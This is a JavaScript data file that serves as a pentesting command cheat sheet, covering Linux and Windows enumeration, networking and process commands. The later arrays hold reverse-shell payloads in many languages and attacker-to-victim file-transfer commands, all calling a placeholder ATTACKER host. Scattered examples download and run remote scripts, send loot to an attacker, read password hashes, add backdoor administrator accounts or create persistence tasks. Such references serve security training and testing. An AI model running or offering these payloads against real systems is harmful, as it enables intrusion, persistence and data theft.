// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Shell Command Reference for Security Professionals
// Complete Linux and Windows command reference for pentesting and defense.

export const LINUX_COMMANDS = {
  file_operations: [
    { cmd: "ls", syntax: "ls [options] [path]", desc: "List directory contents", flags: ["-la (long+hidden)", "-lh (human sizes)", "-R (recursive)", "-t (sort by time)", "-S (sort by size)", "-1 (one per line)", "--color=auto"], examples: ["ls -la /etc/", "ls -lhS /var/log/ | head -20", "ls -la /home/*/.ssh/"] },
    { cmd: "find", syntax: "find [path] [expression]", desc: "Search for files in directory hierarchy", flags: ["-name (filename)", "-iname (case-insensitive)", "-type f|d|l|s", "-size +10M", "-mtime -7 (modified last 7 days)", "-perm -4000 (SUID)", "-exec cmd {} \;", "-user root", "-writable"], examples: ["find / -perm -4000 -type f 2>/dev/null", "find / -name '*.conf' -readable 2>/dev/null", "find / -writable -type d 2>/dev/null", "find /home -name '*.txt' -exec grep -l 'password' {} \;", "find / -user root -perm -4000 -print 2>/dev/null"] },
    { cmd: "cat", syntax: "cat [options] [file]", desc: "Concatenate and display files", flags: ["-n (line numbers)", "-b (number non-blank)", "-s (squeeze blank lines)", "-A (show all)"], examples: ["cat /etc/passwd", "cat -n /etc/shadow", "cat /proc/version"] },
    { cmd: "grep", syntax: "grep [options] pattern [file]", desc: "Search text using patterns", flags: ["-r (recursive)", "-i (case-insensitive)", "-n (line numbers)", "-l (files only)", "-v (invert)", "-E (extended regex)", "-c (count)", "-o (only matching)", "-A/-B/-C N (context lines)", "--include='*.php'"], examples: ["grep -ri 'password' /etc/ 2>/dev/null", "grep -rn 'api_key\\|secret\\|token' /var/www/ --include='*.php'", "grep -E 'root|admin' /etc/passwd", "cat access.log | grep -E '(union|select|insert|update|delete|drop)' -i"] },
    { cmd: "tar", syntax: "tar [options] [archive] [files]", desc: "Archive utility", flags: ["-czf (create gzip)", "-xzf (extract gzip)", "-cjf (create bzip2)", "-xjf (extract bzip2)", "-tvf (list contents)", "-C dir (change dir)"], examples: ["tar czf backup.tar.gz /etc/", "tar xzf archive.tar.gz", "tar tvf suspicious.tar.gz"] },
    { cmd: "chmod", syntax: "chmod [options] mode file", desc: "Change file permissions", flags: ["-R (recursive)", "+x (add execute)", "u+s (set SUID)", "g+s (set SGID)", "+t (sticky bit)"], examples: ["chmod 755 script.sh", "chmod u+s /usr/bin/vuln", "chmod -R 700 ~/.ssh/", "find / -perm -4000 -exec chmod u-s {} \;"] },
    { cmd: "chown", syntax: "chown [options] user:group file", desc: "Change file ownership", flags: ["-R (recursive)", "--reference=file"], examples: ["chown root:root /etc/shadow", "chown -R www-data:www-data /var/www/"] },
    { cmd: "cp", syntax: "cp [options] source dest", desc: "Copy files", flags: ["-r (recursive)", "-p (preserve permissions)", "-a (archive/preserve all)", "-v (verbose)"], examples: ["cp -a /etc/shadow /tmp/shadow.bak", "cp -rp /home/user/.ssh/ /tmp/"] },
    { cmd: "mv", syntax: "mv [options] source dest", desc: "Move/rename files", flags: ["-f (force)", "-i (interactive)", "-v (verbose)"], examples: ["mv malware.exe /tmp/quarantine/", "mv suspicious.log analyzed_suspicious.log"] },
    { cmd: "rm", syntax: "rm [options] file", desc: "Remove files", flags: ["-r (recursive)", "-f (force)", "-i (interactive)"], examples: ["rm -rf /tmp/exploit/", "shred -vfz -n 5 sensitive_file"] },
    { cmd: "head", syntax: "head [options] file", desc: "Output first part of files", flags: ["-n N (first N lines)", "-c N (first N bytes)"], examples: ["head -20 /var/log/auth.log", "head -c 4 binary_file | xxd"] },
    { cmd: "tail", syntax: "tail [options] file", desc: "Output last part of files", flags: ["-n N (last N lines)", "-f (follow/live)", "-F (follow with retry)"], examples: ["tail -f /var/log/auth.log", "tail -100 /var/log/syslog | grep 'Failed'"] },
    { cmd: "xxd", syntax: "xxd [options] file", desc: "Hex dump", flags: ["-r (reverse/hex to binary)", "-l N (length)", "-s N (seek offset)", "-p (plain hex)"], examples: ["xxd binary_file | head", "echo '48656c6c6f' | xxd -r -p", "xxd -l 16 firmware.bin"] },
    { cmd: "strings", syntax: "strings [options] file", desc: "Extract printable strings from binary", flags: ["-n N (min length)", "-a (scan all)", "-e l|b|s|S (encoding)"], examples: ["strings malware.exe | grep -i 'http'", "strings -n 10 /usr/bin/suspicious", "strings firmware.bin | grep -i 'password\\|key\\|secret'"] },
    { cmd: "file", syntax: "file [options] file", desc: "Determine file type", flags: ["-b (brief)", "-i (MIME type)", "-z (compressed)"], examples: ["file suspicious_file", "file -b --mime-type upload.jpg", "file /usr/bin/*"] }
  ],
  networking: [
    { cmd: "ss", syntax: "ss [options]", desc: "Socket statistics (replaces netstat)", flags: ["-tlnp (TCP listening with PID)", "-ulnp (UDP listening)", "-a (all)", "-s (summary)", "-o (timer info)", "-e (extended)"], examples: ["ss -tlnp", "ss -tlnp | grep ':80\\|:443\\|:8080'", "ss -anp | grep ESTAB"] },
    { cmd: "netstat", syntax: "netstat [options]", desc: "Network statistics (legacy)", flags: ["-tlnp (TCP listening)", "-anp (all with PID)", "-r (routing table)", "-i (interfaces)", "-s (stats)"], examples: ["netstat -tlnp", "netstat -anp | grep ESTABLISHED", "netstat -rn"] },
    { cmd: "curl", syntax: "curl [options] URL", desc: "Transfer data from/to server", flags: ["-v (verbose)", "-k (insecure/skip TLS)", "-X METHOD", "-H 'Header: value'", "-d 'data'", "-o file", "-L (follow redirects)", "-s (silent)", "-I (headers only)", "-x proxy", "--cookie 'c=v'", "-u user:pass"], examples: ["curl -v https://target.com", "curl -k -X POST -d 'user=admin&pass=test' https://target.com/login", "curl -H 'Authorization: Bearer TOKEN' https://api.target.com/users", "curl -s http://169.254.169.254/latest/meta-data/", "curl -x http://127.0.0.1:8080 https://target.com"] },
    { cmd: "wget", syntax: "wget [options] URL", desc: "Download files from web", flags: ["-O file", "-q (quiet)", "-r (recursive)", "--mirror", "-P dir", "--no-check-certificate", "--user-agent=UA"], examples: ["wget -O exploit.py https://exploit-db.com/raw/12345", "wget --mirror --convert-links https://target.com", "wget -q -O - https://target.com/robots.txt"] },
    { cmd: "nc", syntax: "nc [options] host port", desc: "Netcat — TCP/UDP connections and listeners", flags: ["-l (listen)", "-v (verbose)", "-p port", "-e cmd (execute on connect)", "-z (scan mode)", "-w timeout", "-u (UDP)"], examples: ["nc -lvnp 4444", "nc target 80", "echo 'GET / HTTP/1.0\\r\\n\\r\\n' | nc target 80", "nc -zv target 1-1000 2>&1 | grep 'open'", "nc -lvnp 4444 -e /bin/bash"] },
    { cmd: "nmap", syntax: "nmap [options] target", desc: "Network scanner", flags: ["-sS (SYN scan)", "-sV (version)", "-sC (scripts)", "-O (OS detect)", "-p- (all ports)", "-Pn (no ping)", "-A (aggressive)", "-T4 (timing)", "--script=NAME", "-oN/-oX (output)"], examples: ["nmap -sS -sV -sC -O target", "nmap -p- -T4 target", "nmap --script vuln target", "nmap -sU -p 53,161,500 target"] },
    { cmd: "dig", syntax: "dig [options] domain [type]", desc: "DNS lookup utility", flags: ["+short", "+noall +answer", "+trace", "@server", "ANY", "AXFR"], examples: ["dig target.com ANY +short", "dig @8.8.8.8 target.com MX", "dig target.com AXFR @ns1.target.com", "dig +trace target.com"] },
    { cmd: "ip", syntax: "ip [object] [command]", desc: "Network configuration", flags: ["addr (addresses)", "route (routing)", "link (interfaces)", "neigh (ARP)", "-br (brief)"], examples: ["ip addr show", "ip route show", "ip neigh show", "ip link set eth0 promisc on"] },
    { cmd: "arp", syntax: "arp [options]", desc: "ARP table management", flags: ["-a (display all)", "-n (numeric)", "-d host (delete)", "-s host MAC (static)"], examples: ["arp -a", "arp -an | grep -v incomplete"] },
    { cmd: "tcpdump", syntax: "tcpdump [options] [expression]", desc: "Packet capture", flags: ["-i interface", "-w file.pcap", "-r file.pcap", "-n (no DNS)", "-X (hex+ASCII)", "-c count", "-A (ASCII)", "-s 0 (full packet)"], examples: ["tcpdump -i eth0 -w capture.pcap", "tcpdump -i eth0 port 80 -A", "tcpdump -r capture.pcap 'tcp port 445'", "tcpdump -i eth0 -n 'host 10.10.10.1 and port 53'"] },
    { cmd: "ssh", syntax: "ssh [options] user@host", desc: "Secure shell", flags: ["-i keyfile", "-p port", "-L local:host:remote (local forward)", "-R remote:host:local (reverse forward)", "-D port (SOCKS proxy)", "-N (no command)", "-o StrictHostKeyChecking=no", "-J jumphost"], examples: ["ssh -i id_rsa user@target", "ssh -L 8080:internal:80 user@jumphost", "ssh -R 4444:localhost:4444 user@attacker", "ssh -D 9050 user@target"] },
    { cmd: "scp", syntax: "scp [options] source dest", desc: "Secure copy over SSH", flags: ["-i keyfile", "-P port", "-r (recursive)", "-p (preserve)"], examples: ["scp loot.zip user@attacker:/tmp/", "scp -r user@target:/var/www/ ./exfil/"] }
  ],
  process_management: [
    { cmd: "ps", syntax: "ps [options]", desc: "Process status", flags: ["aux (all users, detailed)", "-ef (full format)", "--forest (tree)", "-o format", "-p PID"], examples: ["ps aux", "ps aux | grep root", "ps -ef --forest", "ps aux | grep -v '\\[' | awk '{print $11}' | sort -u"] },
    { cmd: "top", syntax: "top [options]", desc: "Real-time process monitor", flags: ["-b (batch mode)", "-n 1 (iterations)", "-p PID", "-u user"], examples: ["top -bn1 | head -20", "top -u www-data"] },
    { cmd: "kill", syntax: "kill [signal] PID", desc: "Send signal to process", flags: ["-9 (SIGKILL)", "-15 (SIGTERM)", "-l (list signals)"], examples: ["kill -9 1234", "kill -SIGSTOP 5678", "killall suspicious_process"] },
    { cmd: "strace", syntax: "strace [options] command", desc: "Trace system calls", flags: ["-p PID (attach)", "-f (follow forks)", "-e trace=network|file|process", "-o file", "-c (summary)"], examples: ["strace -p 1234 -e trace=network", "strace -f -e trace=open,read,write ./suspicious_binary", "strace -c ./program"] },
    { cmd: "ltrace", syntax: "ltrace [options] command", desc: "Trace library calls", flags: ["-p PID", "-e function", "-o file", "-S (syscalls too)"], examples: ["ltrace -e strcmp ./crackme", "ltrace -S ./binary 2>&1 | grep -i 'password\\|key'"] },
    { cmd: "lsof", syntax: "lsof [options]", desc: "List open files", flags: ["-i (network)", "-p PID", "-u user", "+D dir", "-i :port"], examples: ["lsof -i -P -n", "lsof -i :80", "lsof -p 1234", "lsof +D /tmp/"] }
  ],
  user_management: [
    { cmd: "id", syntax: "id [user]", desc: "Display user/group IDs", flags: ["-u (UID only)", "-g (GID only)", "-G (all groups)", "-n (names)"], examples: ["id", "id www-data", "id -Gn"] },
    { cmd: "whoami", syntax: "whoami", desc: "Print current username", flags: [], examples: ["whoami"] },
    { cmd: "w", syntax: "w", desc: "Show logged-in users and activity", flags: [], examples: ["w"] },
    { cmd: "last", syntax: "last [options]", desc: "Show last logins", flags: ["-n N", "-f file", "-x (shutdown/reboot)"], examples: ["last -20", "last -x | head", "lastlog | grep -v 'Never'"] },
    { cmd: "passwd", syntax: "passwd [options] [user]", desc: "Change password", flags: ["-l (lock)", "-u (unlock)", "-d (delete)", "-S (status)"], examples: ["passwd", "passwd -S user", "cat /etc/shadow | grep -v '!' | grep -v '*'"] },
    { cmd: "sudo", syntax: "sudo [options] command", desc: "Execute as another user", flags: ["-l (list permissions)", "-u user", "-i (login shell)", "-s (shell)", "-v (validate)"], examples: ["sudo -l", "sudo -u postgres psql", "sudo -i", "sudo su -"] },
    { cmd: "su", syntax: "su [options] [user]", desc: "Switch user", flags: ["- (login shell)", "-c command", "-s shell"], examples: ["su -", "su - postgres", "su -c 'id' root"] }
  ],
  info_gathering: [
    { cmd: "uname", syntax: "uname [options]", desc: "System information", flags: ["-a (all)", "-r (kernel release)", "-m (machine arch)", "-n (hostname)"], examples: ["uname -a", "uname -r", "cat /etc/os-release"] },
    { cmd: "hostname", syntax: "hostname [options]", desc: "Show/set hostname", flags: ["-I (all IPs)", "-f (FQDN)", "-d (domain)"], examples: ["hostname -I", "hostname -f"] },
    { cmd: "env", syntax: "env", desc: "Display environment variables", flags: [], examples: ["env", "env | grep -i 'key\\|secret\\|password\\|token\\|api'", "printenv PATH"] },
    { cmd: "cat /etc/passwd", syntax: "cat /etc/passwd", desc: "List system users", flags: [], examples: ["cat /etc/passwd | grep -v nologin | grep -v false", "awk -F: '$3 >= 1000 {print $1}' /etc/passwd"] },
    { cmd: "cat /etc/crontab", syntax: "cat /etc/crontab", desc: "View scheduled tasks", flags: [], examples: ["cat /etc/crontab", "ls -la /etc/cron.*", "crontab -l", "for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u 2>/dev/null; done"] },
    { cmd: "df", syntax: "df [options]", desc: "Disk space usage", flags: ["-h (human readable)", "-T (filesystem type)"], examples: ["df -hT", "df -h | grep -v tmpfs"] },
    { cmd: "mount", syntax: "mount", desc: "Show mounted filesystems", flags: [], examples: ["mount", "mount | grep -E 'nosuid|noexec'", "cat /etc/fstab"] },
    { cmd: "dpkg", syntax: "dpkg [options]", desc: "Debian package manager", flags: ["-l (list installed)", "-s package (status)", "--get-selections"], examples: ["dpkg -l | grep -i 'sudo\\|docker\\|apache'", "dpkg -l | wc -l"] }
  ]
};

export const WINDOWS_COMMANDS = {
  enumeration: [
    { cmd: "systeminfo", desc: "Display detailed system configuration", examples: ["systeminfo", "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Hotfix\""] },
    { cmd: "whoami /all", desc: "Current user, groups, and privileges", examples: ["whoami /all", "whoami /priv", "whoami /groups"] },
    { cmd: "net user", desc: "User account management", examples: ["net user", "net user administrator", "net user /domain", "net user hacker P@ss123 /add", "net localgroup Administrators hacker /add"] },
    { cmd: "net group", desc: "Domain group management", examples: ["net group /domain", "net group \"Domain Admins\" /domain", "net group \"Enterprise Admins\" /domain"] },
    { cmd: "net localgroup", desc: "Local group management", examples: ["net localgroup Administrators", "net localgroup \"Remote Desktop Users\""] },
    { cmd: "net share", desc: "Shared resources", examples: ["net share", "net view \\\\target", "net use \\\\target\\C$ /user:admin password"] },
    { cmd: "ipconfig", desc: "Network configuration", examples: ["ipconfig /all", "ipconfig /displaydns"] },
    { cmd: "netstat", desc: "Network connections", examples: ["netstat -ano", "netstat -ano | findstr ESTABLISHED", "netstat -ano | findstr LISTENING"] },
    { cmd: "tasklist", desc: "Running processes", examples: ["tasklist /v", "tasklist /svc", "tasklist | findstr /i \"antivirus defender\""] },
    { cmd: "schtasks", desc: "Scheduled tasks", examples: ["schtasks /query /fo LIST /v", "schtasks /create /sc minute /mo 1 /tn 'Backdoor' /tr 'C:\\shell.exe'"] },
    { cmd: "wmic", desc: "WMI command-line interface", examples: ["wmic os get caption,version", "wmic product get name,version", "wmic service list brief", "wmic qfe list brief", "wmic useraccount list brief", "wmic process list brief"] },
    { cmd: "reg query", desc: "Registry queries", examples: ["reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s", "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultDomainName DefaultPassword\""] },
    { cmd: "icacls", desc: "File/folder permissions", examples: ["icacls C:\\Windows\\System32\\config\\SAM", "icacls \"C:\\Program Files\\*\" /T /C 2>nul | findstr /i \"(F) (M) (W) :\" | findstr /i \"Everyone Users Authenticated\""] },
    { cmd: "sc", desc: "Service control", examples: ["sc query state= all", "sc qc vulnerable_service", "sc config vuln_svc binpath= \"cmd /c net user hacker P@ss /add\""] },
    { cmd: "cmdkey", desc: "Stored credentials", examples: ["cmdkey /list"] },
    { cmd: "dir", desc: "Directory listing", examples: ["dir /s /b C:\\*.txt 2>nul | findstr /i password", "dir /s /b C:\\Users\\*password* 2>nul", "dir C:\\Users\\*/s /b /a:-d 2>nul"] }
  ],
  powershell: [
    { cmd: "Get-Process", desc: "List processes", examples: ["Get-Process | Sort-Object CPU -Descending | Select -First 10"] },
    { cmd: "Get-Service", desc: "List services", examples: ["Get-Service | Where-Object {$_.Status -eq 'Running'}"] },
    { cmd: "Get-ChildItem", desc: "List files (dir/ls equivalent)", examples: ["Get-ChildItem -Path C:\\ -Recurse -Include *.txt -ErrorAction SilentlyContinue | Select-String 'password'"] },
    { cmd: "Get-LocalUser", desc: "List local users", examples: ["Get-LocalUser | Select Name,Enabled,LastLogon"] },
    { cmd: "Get-LocalGroupMember", desc: "List group members", examples: ["Get-LocalGroupMember -Group 'Administrators'"] },
    { cmd: "Get-NetTCPConnection", desc: "Network connections (netstat equivalent)", examples: ["Get-NetTCPConnection -State Established | Select LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess"] },
    { cmd: "Test-NetConnection", desc: "Test connectivity (ping/tracert/port check)", examples: ["Test-NetConnection target -Port 445", "1..1024 | % {Test-NetConnection target -Port $_ -WarningAction SilentlyContinue | Where {$_.TcpTestSucceeded}}"] },
    { cmd: "Invoke-WebRequest", desc: "HTTP requests (curl equivalent)", examples: ["Invoke-WebRequest -Uri 'http://attacker/shell.ps1' -OutFile shell.ps1", "(Invoke-WebRequest http://attacker/shell.ps1).Content | IEX"] },
    { cmd: "Get-Acl", desc: "Get file/folder ACL", examples: ["Get-Acl C:\\important\\file.txt | Format-List"] },
    { cmd: "Get-WmiObject", desc: "WMI queries", examples: ["Get-WmiObject Win32_OperatingSystem | Select Caption,Version,BuildNumber", "Get-WmiObject Win32_Product | Select Name,Version"] }
  ]
};

export const REVERSE_SHELLS = [
  { language: "Bash", payload: "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1" },
  { language: "Bash (alt)", payload: "bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'" },
  { language: "Python", payload: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
  { language: "PHP", payload: "php -r '$sock=fsockopen(\"ATTACKER\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
  { language: "Perl", payload: "perl -e 'use Socket;$i=\"ATTACKER\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
  { language: "Ruby", payload: "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKER\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
  { language: "Netcat (traditional)", payload: "nc -e /bin/sh ATTACKER PORT" },
  { language: "Netcat (no -e)", payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f" },
  { language: "PowerShell", payload: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"" },
  { language: "Node.js", payload: "node -e '(function(){var c=require(\"net\").connect(PORT,\"ATTACKER\",function(){var sh=require(\"child_process\").exec(\"/bin/sh\");c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});})();'" },
  { language: "Lua", payload: "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('ATTACKER','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\"" },
  { language: "Socat", payload: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:PORT" },
  { language: "Java", payload: "Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"});" }
];

export const SHELL_UPGRADES = [
  { step: 1, name: "Python PTY", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
  { step: 2, name: "Background shell", command: "Ctrl+Z (background the shell)" },
  { step: 3, name: "Fix terminal", command: "stty raw -echo; fg" },
  { step: 4, name: "Set terminal type", command: "export TERM=xterm-256color" },
  { step: 5, name: "Set shell", command: "export SHELL=/bin/bash" },
  { step: 6, name: "Fix rows/cols", command: "stty rows R cols C (match your terminal: stty -a)" }
];

export const FILE_TRANSFER_METHODS = [
  { method: "Python HTTP Server", attacker: "python3 -m http.server 80", victim: "wget http://ATTACKER/file -O /tmp/file" },
  { method: "Netcat", attacker: "nc -lvnp 4444 < file", victim: "nc ATTACKER 4444 > file" },
  { method: "SCP", attacker: "", victim: "scp file user@ATTACKER:/tmp/" },
  { method: "Curl", attacker: "python3 -m http.server 80", victim: "curl http://ATTACKER/file -o /tmp/file" },
  { method: "Base64", attacker: "base64 file", victim: "echo 'BASE64_STRING' | base64 -d > file" },
  { method: "PowerShell Download", attacker: "python3 -m http.server 80", victim: "Invoke-WebRequest -Uri http://ATTACKER/file -OutFile C:\\file" },
  { method: "Certutil (Windows)", attacker: "python3 -m http.server 80", victim: "certutil -urlcache -split -f http://ATTACKER/file C:\\file" },
  { method: "SMB Server", attacker: "impacket-smbserver share /tmp/share -smb2support", victim: "copy \\\\ATTACKER\\share\\file C:\\file" },
  { method: "PHP Download", attacker: "python3 -m http.server 80", victim: "php -r \"file_put_contents('/tmp/file', file_get_contents('http://ATTACKER/file'));\"" }
];
